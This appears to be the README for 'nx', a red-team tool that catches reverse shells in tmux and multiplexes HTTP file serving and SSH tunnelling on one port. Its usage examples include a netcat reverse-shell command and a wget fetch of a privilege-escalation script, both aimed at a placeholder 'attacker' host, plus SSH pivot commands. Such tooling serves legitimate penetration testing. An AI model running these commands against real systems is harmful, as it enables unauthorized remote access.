# nx

[n]etcat + tmu[x] - listen on a port and forward the stream to a tmux session

All-in-One:
- reverse shell
- http server
- port-forwarding-only ssh server

## Prerequisites

- tmux - required for session/window management
- socat - required for TTY handling and keystroke forwarding

## Installation

### From source
```bash
git clone https://github.com/audibleblink/nx
cd nx
go build -o nx .
./nx --install-plugins  # Install bundled plugins
```

### Using go install
```bash
go install github.com/audibleblink/nx@latest
nx --install-plugins  # Install bundled plugins
```

The `--install-plugins` flag copies bundled plugins (like `auto.sh`) to `~/.config/nx/plugins/`. This only needs to be run once after installation.

## Usage

1. start a listener
```sh
nx -vp 9090
```

2. from a different machine, initiate the reverse shell
3. nx catches the connection then starts a tmux window in the `nx` session, and starts the shell there

```
Usage:
  nx [OPTIONS]

Application Options:
      --auto           Attempt to auto-upgrade to a tty (deprecated: use --exec auto)
      --exec=          Execute plugin script on connection
      --install-plugins Install bundled plugins to config directory
  -i, --host=      Interface address on which to bind (default: 0.0.0.0)
  -p, --port=      Port on which to bind (default: 8443)
  -t, --target=    Tmux session name (default: nx)
  -v, --verbose    Debug logging
      --sleep=     adjust if --auto is failing (default: 500ms)
  -d, --serve-dir= Directory to serve files from over HTTP
  -s, --ssh-pass=  SSH password (empty = no auth)
```

## Features

- **Plugin system**: Use `--exec <plugin>` to run custom scripts on connection
- **Auto-upgrade to TTY**: Use `--exec auto` (or deprecated `--auto` flag) to automatically upgrade your shell to a TTY
- **Protocol multiplexing**: Serve files over HTTP and SSH tunneling on the same port as shell connections
- **SSH tunneling**: Support for local (-L) and remote (-R) port forwarding with optional password authentication
- **XDG runtime paths**: Automatically uses XDG runtime directory for socket location
- **Signal handling**: Properly handles signals and performs cleanup

## Plugin System

nx supports a plugin system for executing custom commands when a new connection is established. Plugins are shell scripts stored in `~/.config/nx/plugins/`.

### Creating Plugins

1. Create a shell script in `~/.config/nx/plugins/<name>.sh`
2. Make it executable: `chmod +x ~/.config/nx/plugins/<name>.sh`
3. Use the plugin: `nx --exec <name>`

### Plugin Format

Plugins are simple shell scripts with these features:
- Lines starting with `#` are ignored (comments)
- Empty lines are ignored
- All other lines are executed as tmux `send-keys` commands in the reverse shell

### Example Plugin

```bash
#!/bin/bash
# Custom upgrade script
echo "Setting up environment..."
export PATH=/usr/local/bin:$PATH
whoami
```

### Built-in Plugins

- **auto**: TTY upgrade script

## Protocol Multiplexing

nx can serve files over HTTP, act as an HTTP proxy, and provide SSH tunneling on the same port as shell connections. This allows you to serve files, create SSH tunnels, provide internet to air-gapped machines, and catch shells over a single port.

### HTTP File Serving

Enable file serving by specifying a directory with the `-d` or `--serve-dir` flag:

```bash
# Start nx with file serving enabled
nx -p 8443 -d ./files -v

# Shell connections still work normally
nc -e /bin/bash attacker 8443

# From target machine - download files
wget http://attacker:8443/linpeas.sh

```


## SSH Tunneling

nx supports SSH tunneling for port forwarding without providing shell access.

### SSH Usage Examples

```bash
# Start nx with SSH tunneling (no password)
nx -p 8443 -v

# Start nx with SSH password authentication
nx -p 8443 -s mypassword -v

# From client - Local port forwarding (-L)
ssh -L 8080:internal-server:80 -N user@attacker -p 8443

# From client - Remote port forwarding (-R)  
ssh -R 9090:localhost:22 -N user@attacker -p 8443
```


## How?

unix domain sockets mannn

## ToDo
- [x] ~~maybe a plugin system for sending commands on connection~~ ✅ **DONE**: Implemented plugin system with `--exec` flag
- [x] ~~some mechanism to auto-upgrade the shell to a TTY via tmux-send-keys or sourcing a script that just adds the keybinds, so that it's up to the user to fire off the upgrade~~ ✅ **DONE**: Auto-upgrade via `--exec auto`
- [x] ~~alternatively, multiplex the connection to allow `curl | sh` from the same port~~ ✅ **DONE**: Protocol multiplexing with `--serve-dir`
- [x] ~~multiplexing listener~~ ✅ **DONE**: HTTP/shell protocol detection on same port
- [x] ~~super simple chisel-light functionality~~ ✅ **DONE**: SSH tunneling with local/remote port forwarding
- [x] facilitate installing plugins dir to xdg
- [ ] handle stdio with the socket directly with `nx`, eliminating the need for `socat`
